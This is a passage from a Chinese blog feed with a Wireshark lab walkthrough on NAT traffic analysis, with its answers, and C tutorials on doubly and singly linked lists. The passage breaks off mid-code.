        <content type="html"><![CDATA[<h1 id="EduCoder-NAT协议分析"><a href="#EduCoder-NAT协议分析" class="headerlink" title="EduCoder NAT协议分析"></a>EduCoder NAT协议分析</h1><p>关卡1 : 掌握抓取 <code>NAT HOME</code> 端和 <code>NAT ISP</code> 端的具体步骤，并且对已经收集到的 NAT HOME 进行分析。</p><p>关卡2 : 对已经收集到的 <code>NAT ISP</code> 进行分析，在路由器和 ISP 之间的链路上捕获的跟踪文件<code>NAT_ISP_side</code>中找到这两个 HTTP 消息和两个 TCP 报文。</p><h2 id="0x01-NAT-HOME分析"><a href="#0x01-NAT-HOME分析" class="headerlink" title="0x01 NAT HOME分析"></a>0x01 NAT HOME分析</h2><h3 id="0x0101-相关知识"><a href="#0x0101-相关知识" class="headerlink" title="0x0101 相关知识"></a>0x0101 相关知识</h3><p>为了完成本关任务，你需要掌握：</p><ol><li>简单了解实验抓包收集方案.</li><li>NAT HOME的简单分析.</li></ol><h3 id="0x0102-实验流程"><a href="#0x0102-实验流程" class="headerlink" title="0x0102 实验流程"></a>0x0102 实验流程</h3><p><strong>(1) 打开 Wireshark，加载实训文件夹中的<code>NAT_home_side</code>文件并筛选出其中的 HTTP 报文；</strong></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412010311630.png" alt="image-20220412010311630"></p><p>过滤器中输入<code>http</code>筛选HTTP报文:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412010440500.png" alt="image-20220412010440500"></p><p><strong>(2) 客户端的 IP 地址是多少？填写到文件中；</strong></p><p>分析所给流量包中的数据可知其中的私有IP地址为:  <strong>192.168.1.100</strong></p><p>或者通过Terminal输入指令: <code>ifconfig</code>(Windows为<code>ipconfig</code>)得到.</p><p><strong>(3)在 Wireshark 过滤器输入以下过滤式<code>http &amp;&amp; ip.addr == 64.233.169.104 </code>;</strong></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412010858390.png" alt="image-20220412010858390"></p><p><strong>(4)选择在 7.109267s 时间的客户端发送到 Google 服务器的 HTTP GET。请问此 HTTP GET 的 IP 数据报上的源 IP 地址和目标 IP 地址以及 TCP 源和目标端口是什么？填写到文件中（用；隔开）；</strong></p><p>源IP地址和目的IP地址如下:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412011046646.png" alt="image-20220412011046646"></p><p>TCP数据段段源端口和目的端口:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412011154938.png" alt="image-20220412011154938"></p><p><strong>(5)什么时候从 Google 服务器收到相应的状态码 200、状态 OK 的 HTTP 响应消息？填写到文件中；</strong></p><p>对应的响应消息为:<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412011259679.png" alt="image-20220412011259679"></p><p>所以时间为 <strong>7.158797s</strong></p><p><strong>(6)携带状态码<code>200</code>、状态 OK 的 HTTP 响应消息的 IP 数据报上的源和目标 IP 地址以及 TCP 源端口和目标端口是什么？填写到文件中（用；隔开，注意区分中英文）；</strong></p><p>如图所示:<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412011359389.png" alt="image-20220412011359389"></p><h3 id="0x0103-最终结果"><a href="#0x0103-最终结果" class="headerlink" title="0x0103 最终结果"></a>0x0103 最终结果</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">客户端IP: 192.168.1.100</span><br><span class="line">源IP和端口: 192.168.1.100;4335</span><br><span class="line">目的IP和端口: 64.233.169.104;80</span><br><span class="line">从Goog1e服务器收到相应状态码200、状态0K的HTTP响应消息的时间：7.158797s</span><br><span class="line">携带状态码200、状态0K的HTTP响应消息的IP数据报上的源IP地址和端口:64.233.169.104;80</span><br><span class="line">携带状态码200、状态0K的HTTP响应消息的IP数据报上的目的IP地址和端口:192.168.1.100;4335</span><br></pre></td></tr></table></figure><h2 id="0x02-NAT-ISP分析"><a href="#0x02-NAT-ISP分析" class="headerlink" title="0x02 NAT ISP分析"></a>0x02 NAT ISP分析</h2><h3 id="0x0201-相关知识"><a href="#0x0201-相关知识" class="headerlink" title="0x0201 相关知识"></a>0x0201 相关知识</h3><p>为了完成本关任务，你需要掌握：</p><ul><li>NAT ISP 的简单分析。</li></ul><h3 id="0x0202-实验流程"><a href="#0x0202-实验流程" class="headerlink" title="0x0202 实验流程"></a>0x0202 实验流程</h3><p><strong>（1）打开 Wireshark，加载实训文件夹中的<code>NAT_ISP_side</code>文件，在过滤器输入过滤式<code>http &amp;&amp; ip.addr == 64.233.169.104 </code>；</strong></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412012044975.png" alt="image-20220412012044975"></p><p><strong>（2）找到跟刚才客户端 7.109267s 同样目的地发送的 HTTP GET 消息，请问该消息何时出现在<code>NAT_ISP_side</code>跟踪文件中？填写到文件中；</strong></p><p>通过分析流量包中的<code>HTTP GET</code>消息的info可以得到在__6.069168s__发送的数据包符合要求.</p><p><strong>（3）承载此 HTTP GET 消息的 IP 数据报的源和目的 IP 以及端口是多少？填写到文件中（用；隔开，注意区分中英文）；</strong></p><p>如下图所示:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412012330466.png" alt="image-20220412012330466"></p><p><strong>（4）对比两个跟踪文件，回答 HTTP GET 消息中的任何字段是否已更改？（填写”是&#x2F;否”）;</strong></p><p>对比两个收集到的跟踪文件, 可以发现 HTTP GET 消息中的任何字段都没有更改, 如下图所示:</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220412012619934.png" alt="image-20220412012619934"></p><h3 id="0x0203-最终结果"><a href="#0x0203-最终结果" class="headerlink" title="0x0203 最终结果"></a>0x0203 最终结果</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">消息出现在NAT_ISP_side跟踪文件的时间是：6.069168s</span><br><span class="line">承载此 HTTP GET 消息的 IP 数据报的源IP和端口是：71.192.34.104;4335</span><br><span class="line">承载此 HTTP GET 消息的 IP 数据报的目的IP和端口是：64.233.169.104;80</span><br><span class="line">对比两个跟踪文件，HTTP GET 消息中的任何字段是否更改：否</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 网络协议分析 </tag>
            
            <tag> NAT </tag>
            
            <tag> ISP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[数据结构]双链表</title>
      <link href="/2022/04/10/30f3ce2b2238-q1jun/"/>
      <url>/2022/04/10/30f3ce2b2238-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="双链表-Double-LinkList"><a href="#双链表-Double-LinkList" class="headerlink" title="双链表(Double LinkList)"></a>双链表(Double LinkList)</h1><p>在单链表中, 无法逆向检索, 有时候不太方便, 于是有了双链表.</p><blockquote><p>单链表只包含指向后继结点的指针, 双链表则是在单链表的基础上增加了一个指针域<code>prior</code>用于指向前驱结点. </p></blockquote><h2 id="0x01-双链表的定义"><a href="#0x01-双链表的定义" class="headerlink" title="0x01 双链表的定义"></a>0x01 双链表的定义</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> &#123;</span> <span class="comment">//定义双链表结点类型</span></span><br><span class="line">    <span class="type">int</span> data; <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>* <span class="title">prior</span>, * <span class="title">next</span>;</span> <span class="comment">//前驱指针和后继指针</span></span><br><span class="line">&#125;DNode, * DLinklist;</span><br></pre></td></tr></table></figure><p>或者:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> &#123;</span> <span class="comment">//定义双链表结点类型</span></span><br><span class="line">    <span class="type">int</span> data; <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>* <span class="title">prior</span>, * <span class="title">next</span>;</span> <span class="comment">//前驱指针和后继指针</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> <span class="title">Dnode</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> * <span class="title">DLinklist</span>;</span></span><br></pre></td></tr></table></figure><p>两者等价.</p><h2 id="0x02-双链表的初始化"><a href="#0x02-双链表的初始化" class="headerlink" title="0x02 双链表的初始化"></a>0x02 双链表的初始化</h2><p>双链表中有<code>前驱指针</code>和<code>后继指针</code>, 初始化一个双链表时前驱指针和后继指针所指向的都是<code>NULL</code>.</p><blockquote><p>双链表头指针的<code>前驱指针</code>和末尾结点的<code>后继指针</code>所指向的永远为<code>NULL</code>.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * @description: 初始化双链表</span></span><br><span class="line"><span class="comment"> * @param &#123;DLinklist&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitDLinkList</span><span class="params">(DLinklist&amp; L)</span> &#123;</span><br><span class="line">    L = (DNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode)); <span class="comment">//分配一个头结点</span></span><br><span class="line">    <span class="keyword">if</span> (L == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//内存不足, 分配失败</span></span><br><span class="line">    L-&gt;prior = <span class="literal">NULL</span>; <span class="comment">//头结点 prior 永远指向NULL</span></span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>; <span class="comment">//头结点之后暂时还没有结点所以为NULL</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-双链表的插入"><a href="#0x03-双链表的插入" class="headerlink" title="0x03 双链表的插入"></a>0x03 双链表的插入</h2><p>以下代码演示的是双链表的后插操作, 但实际上只需要用后插操作就能完成双链表的一系列插入操作,<br>例如你将在某一个结点处实现前插操作时只需要在该结点的前一个结点(双链表很容易找到前驱结点)使用后插操作即可.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 在p结点之后插入s结点</span></span><br><span class="line"><span class="comment"> * @param &#123;DNode*&#125; p</span></span><br><span class="line"><span class="comment"> * @param &#123;DNode*&#125; s</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InsertNextDNode</span><span class="params">(DNode* p, DNode* s)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || s == <span class="literal">NULL</span>) <span class="comment">//非法参数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    s-&gt;next = p-&gt;next; <span class="comment">//将结点*s插入到结点*p之后</span></span><br><span class="line">    <span class="keyword">if</span> (p-&gt;next != <span class="literal">NULL</span>) <span class="comment">//解决如果p结点是末尾结点,则会出现空指针报错的问题</span></span><br><span class="line">        p-&gt;next-&gt;prior = s;</span><br><span class="line">    s-&gt;prior = p;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按位序插入可根据单链表的代码进行, 原理相同, 不再演示. (不是懒😤</p><h2 id="0x04-双链表的删除"><a href="#0x04-双链表的删除" class="headerlink" title="0x04 双链表的删除"></a>0x04 双链表的删除</h2><p>删除双链表其中一个结点的实现代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 删除结点p</span></span><br><span class="line"><span class="comment"> * @param &#123;DNode*&amp;&#125; p</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">DeleteDNode</span><span class="params">(DNode*&amp; p)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;next) &#123; <span class="comment">//如果p不是末尾指针</span></span><br><span class="line">        p-&gt;prior-&gt;next = p-&gt;next; <span class="comment">//将p的前驱结点的后继指针改为指向p的后继结点</span></span><br><span class="line">        p-&gt;next-&gt;prior = p-&gt;prior; <span class="comment">//将p的后继结点的前驱指针改为指向p的前驱结点</span></span><br><span class="line">        <span class="comment">//看起来很绕,其实只是把原属于p的两个指针域让去(个人觉得这样好理解)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">//如果p是末尾指针</span></span><br><span class="line">        p-&gt;prior-&gt;next = <span class="literal">NULL</span>; <span class="comment">//只需要把唯一与p相连的前驱结点的后继指针改为NULL即可</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>删除双链表其中一个结点的后继结点:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 删除p结点的后继结点</span></span><br><span class="line"><span class="comment"> * @param &#123;DNode*&#125; p</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">DeleteNextDNode</span><span class="params">(DNode* p)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    DNode* q = p-&gt;next; <span class="comment">//找到p的后继结点q</span></span><br><span class="line">    <span class="keyword">if</span> (q == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//若p没有后继结点</span></span><br><span class="line">    p-&gt;next = q-&gt;next;</span><br><span class="line">    <span class="keyword">if</span> (q-&gt;next != <span class="literal">NULL</span>) <span class="comment">//判断q是否为最后一个结点</span></span><br><span class="line">        q-&gt;next-&gt;prior = p;</span><br><span class="line">    <span class="built_in">free</span>(q); <span class="comment">//释放结点空间</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//删除成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>彻底释放(销毁)一个双链表:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 释放(销毁)一个双链表</span></span><br><span class="line"><span class="comment"> * @param &#123;DLinklist&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DestroyList</span><span class="params">(DLinklist&amp; L)</span> &#123;</span><br><span class="line">    <span class="comment">//循环释放各个数据结点</span></span><br><span class="line">    <span class="keyword">while</span> (L-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">        DeleteNextDNode(L);</span><br><span class="line">    <span class="built_in">free</span>(L); <span class="comment">//释放头结点</span></span><br><span class="line">    L = <span class="literal">NULL</span>; <span class="comment">//头指针指向NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-双链表的遍历"><a href="#0x05-双链表的遍历" class="headerlink" title="0x05 双链表的遍历"></a>0x05 双链表的遍历</h2><blockquote><p>下方注释中的<code>//···对结点p做相遇处理的代码行···</code>指在次可以添加一些操作如打印、计数等.</p></blockquote><p>后向遍历: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>( p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">  <span class="comment">//···对结点p做相遇处理的代码行···</span></span><br><span class="line">  p = p-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前向遍历:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>( p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">  <span class="comment">//···对结点p做相遇处理的代码行···</span></span><br><span class="line">  p = p-&gt;prior;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向前遍历(跳过头结点):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>( p-&gt;prior !=<span class="literal">NULL</span>)&#123;</span><br><span class="line">  <span class="comment">//···对结点p做相遇处理的代码行···</span></span><br><span class="line">  p = p-&gt;prior;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>谢谢观看 😘</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[数据结构]线性表中的单链表</title>
      <link href="/2022/04/06/919a9f355e0d-q1jun/"/>
      <url>/2022/04/06/919a9f355e0d-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="链表-Linked-List"><a href="#链表-Linked-List" class="headerlink" title="链表(Linked List)"></a>链表(Linked List)</h1><p>链表是由<code>链式存储</code>的方式实现的顺序表。（不支持随机存取）</p><h2 id="0x01-单链表"><a href="#0x01-单链表" class="headerlink" title="0x01 单链表"></a>0x01 单链表</h2><blockquote><p>顺序表（顺序存储）：</p><ul><li>优点：可随机存取，存储密度高</li><li>缺点：要求大片连续空间，改变容量不方便</li></ul><p>单链表（链式存储）：</p><ul><li>优点：不要求大片连续空间，改变容量方便</li><li>缺点：不可随机存取，要耗费一定空间存放指针</li></ul></blockquote><h3 id="0x0101单链表的实现"><a href="#0x0101单链表的实现" class="headerlink" title="0x0101单链表的实现"></a>0x0101单链表的实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span><span class="comment">//定义单链表结点类型</span></span><br><span class="line">  ElemType data;<span class="comment">//每个节点存放一个数据元素</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span> <span class="comment">//指针指向下一个节点</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> <span class="title">LNode</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">LinkList</span>;</span></span><br></pre></td></tr></table></figure><p>或者,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span> <span class="comment">//定义单链表结点类型</span></span><br><span class="line">  ElemType data;<span class="comment">//每个节点存放一个数据元素</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span> <span class="comment">//指针指向下一个节点</span></span><br><span class="line">&#125;LNode, *LinkList;</span><br></pre></td></tr></table></figure><p>两者等价。</p><p>要表示一个单链表时，只需声明一个<code>头指针</code>L，指向单链表的第一个节点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LNode *L; <span class="comment">//声明一个指向单链表第一个节点的指针</span></span><br></pre></td></tr></table></figure><p>或者,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LinkList L; <span class="comment">//声明一个指向单链表第一个节点的指针（此方法可读性更强）</span></span><br></pre></td></tr></table></figure><blockquote><p>强调这是一个单链表 – 使用<code>LinkList</code></p><p>强调这是一个结点     – 使用LNode</p></blockquote><p>单链表又分为<code>带头结点</code>和<code>不带头结点</code>两种:<br>如果不带头结点,写代码更麻烦,对对一个<code>数据结点</code>和<code>后续数据结点</code>的处理需要用不同的代码逻辑.<br>对<code>空表</code>和<code>非空表</code>的处理需要用不同的代码逻辑</p><blockquote><p>总之,用带头结点的单链表写代码更方便.</p></blockquote><p>下面将会分别用代码演示一下带头结点和不带头结点的区别.</p><blockquote><p>如果是考研的好哥哥,带头结点和不带头结点都有可能考,审题就完了.</p></blockquote><h2 id="0x02-带头结点的单链表"><a href="#0x02-带头结点的单链表" class="headerlink" title="0x02 带头结点的单链表"></a>0x02 带头结点的单链表</h2><p>(头节点不存放数据data)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data; <span class="comment">//每一个节点存放的数据</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>* <span class="title">next</span>;</span> <span class="comment">//存放下一个结点</span></span><br><span class="line">&#125;LNode, *LinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 初始化一个单链表，带头节点(头节点不存放数据data)</span></span><br><span class="line"><span class="comment"> * @param &#123;LinkList&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList&amp; L)</span> &#123;</span><br><span class="line">    L = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode)); <span class="comment">//分配一个头节点</span></span><br><span class="line">    <span class="keyword">if</span> (L == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//内存不足，分配失败</span></span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>; <span class="comment">//头节点之后的节点为NULL，无子节点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 判断带头节点的单链表是否为空表</span></span><br><span class="line"><span class="comment"> * @param &#123;LinkList&#125; L</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isEmpty</span><span class="params">(LinkList L)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (L-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// or return (L-&gt;next == NULL);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkList L; <span class="comment">//声明一个指向单链表的指针</span></span><br><span class="line">    InitList(L); <span class="comment">//初始化一个空表</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x0201-按位序插入操作"><a href="#0x0201-按位序插入操作" class="headerlink" title="0x0201 按位序插入操作"></a>0x0201 按位序插入操作</h3><blockquote><p>算法思想: 遍历链表, 找到需要插入的地方直接插入即可.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 在第i个位置插入元素e(带头结点的单链表)</span></span><br><span class="line"><span class="comment"> * @param &#123;LinkList&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; i</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; e</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(LinkList&amp; L, <span class="type">int</span> i, <span class="type">int</span> e)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode* p; <span class="comment">//指针p指向当前扫描到的结点</span></span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>; <span class="comment">//当前p指向的是第几个结点</span></span><br><span class="line">    p = L; <span class="comment">//L指向头结点,头结点是第0个结点(不存数据)</span></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span> &amp;&amp; j &lt; i - <span 